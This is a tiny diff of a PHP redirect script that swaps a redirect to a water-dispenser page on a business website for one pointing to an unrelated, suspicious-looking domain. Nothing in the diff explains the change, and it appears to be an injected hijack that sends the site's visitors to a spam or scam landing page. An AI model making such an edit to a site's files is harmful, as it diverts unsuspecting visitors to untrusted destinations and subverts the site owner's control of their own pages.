@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.living-water.co.uk/water-dispensers/");
+header("Location: https://start-your-product.site/actnor");
 die();
 ?>
